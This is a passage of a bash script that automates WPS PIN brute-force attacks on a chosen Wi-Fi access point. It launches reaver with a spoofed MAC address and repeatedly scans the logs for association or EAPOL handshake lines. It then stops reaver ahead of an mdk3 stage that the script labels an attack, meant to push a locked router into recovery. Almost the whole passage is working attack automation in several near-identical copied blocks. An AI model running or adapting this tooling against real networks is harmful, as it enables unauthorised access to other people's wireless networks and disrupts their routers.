done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE



############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == n || $USE_LONG1 == N ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Recurring-delay pin attempts x     = $yel$RX1" 
echo -e "$info Recurring-delay sleep in sec y     = $yel$RY1"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"
echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver2h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -vv -x 60 -r $RX1:$RY1 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "
echo -e "$warn Monitor WPS Pin Collection - Adjust Reaver Live Time Accordingly!!!$txtrst"
echo -e ""

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1	

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

#######################

if [[ $USE_R1 == n || $USE_R1 == N ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
echo -e "$info Reaver live time                   = $yel$LIVE1$info sec"
echo -e "$info Reaver start/stop cycles remaining = $yel$COUNT"
echo -e "$info Text Log  in  /root/VARMAC_LOGS    = $yel$NAME1-$DATEFILE-$PAD"

echo -e "$txtrst"

Eterm -g 80x10-1+100 --cmod "red" -T "Reaver3h" -e sh -c "reaver -i $MON -a -b $TARGETAP1 -L -E -S -vv -N -T 1 -t 20 -d 0 -x 30 --mac=$VARMAC 2>&1 | tee VARMAC_LOGS/$NAME1-$DATEFILE-$PAD" &

echo -e "$info Router Pause/Recovery Time         = $yel$PAUSE$info sec"
echo -e "$info MDK3 Attack Time                   = $yel$MDKLIVE$info sec"
echo -e " "

#######DETERMINE WPS LOCKED-NO ASSOC BEGIN ########
# Divide time to take file snaps every 1/5 LIVE time to avoid subprocess hang with tail.
LIVEDIV=$(((($ADVAN_TIME-60))/8))
LINECAP=2 # Set line capture switch

if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

if [ $LINECAP -eq 2 ]; then 
	tput sc
	echo " "
	echo -e "$info  1. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "1. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################

if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  2. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep 30

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "2. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  3. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "3. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  4. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "4. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  5. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "5. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed	
	echo " "
	echo -e "$info  6. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "6. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  7. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "7. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  8. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "8. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  9. Reading VARMAC_LOGS/$NAME1-$DATEFILE-$PAD for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "9. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

##########################
if [ $LINECAP -eq 2 ]; then 
	tput rc
	tput ed
	echo " "
	echo -e "$info  10. Reading$yel VARMAC_LOGS/$NAME1-$DATEFILE-$PAD$info for AP association."
	sleep $LIVEDIV

           fi

if [ $LINECAP -eq 2 ]; then

while read line

	do

	 if [[ $line == "[+] Associated with $TARGETAP1 (ESSID: $NMEWARN1)" ]] || [[ $line == "YYY11" ]] || [[ $line == "YYY12" ]] || [[ $line == "YYY13" ]] || [[ $line == "YYY14" ]] || [[ $line == "YYY15" ]]; then 

                    LINECAP=1 # old let

		fi

#echo "10. Reading file for AP association."

done < VARMAC_LOGS/$NAME1-$DATEFILE-$PAD

                   fi

contents=$(cat "VARMAC_LOGS/$NAME1-$DATEFILE-$PAD")
case $contents in
	*"$EAPOL"*)
	LINECAP=1

         esac

if [[ $DAMP_MDK == y || $DAMP_MDK == Y ]] && [[ $LINECAP -eq 2 ]] ; then	

			OVERRIDE_MDK3=y

				fi

##########################
# Add more scan modules here in sets of division of ADVAN_LIVE

############################

		fi  # Linked to=if [[ $ADVANMON == y ]] || [[ $ADVANMON == Y ]]; then

############################ End of Advanced monitering #########################

if  [[ $REAVER_COUNT == y || $REAVER_COUNT == Y ]] && [[ $OVERRIDE_MDK3 == n ]]; then

seconds=$LIVE1; date1=$((`date +%s` + $seconds)); 

while [ "$date1" -ne `date +%s` ]; do 
echo -ne "$info ADVAN_TIME expired or router response seen. Time before mdk3 start. $yel $(date -u --date @$(($date1 - `date +%s` )) +%H:%M:%S)\r"; 

	done

		fi

if  [[ $REAVER_COUNT == n || $REAVER_COUNT == N ]] && [[ $OVERRIDE_MDK3 == n ]]; then

		echo " "
		echo -e " ADVAN_TIME expired or router response seen - reaver will run for$yel $LIVE1$info sec before starting mdk3!"
		sleep $LIVE1

		fi

echo -e "$txtrst"

PIDREV=$(airmon-ng check | grep "reaver" | sed s/"(reaver) is running on interface $MON"//g)
#
PIDREV1=${PIDREV##*D }
#
kill -s SIGINT $PIDREV1

sleep 2
killall -q Eterm &> /dev/null
clear
	fi

###################

if [[ $USE_R1 == y || $USE_R1 == Y ]] && [[ $USE_LONG1 == y || $USE_LONG1 == Y ]] && [[ $USE_PIN1 == n || $USE_PIN1 == N ]] && [[ $CHANNEL1 == 0 ]]; then

echo -e " "
echo -e "$info             Starting Reaver"
echo -e "$info TargetAP Name                      = $yel$NMEWARN1"
echo -e "$info Monitor                            = $yel$MON"
echo -e "$info Channel(note 0 = channel hopping)  = $yel$CHANNEL1"
echo -e "$info Mac code of Target AP              = $yel$TARGETAP1"
echo -e "$info Random Mac code                    = $yel$VARMAC"
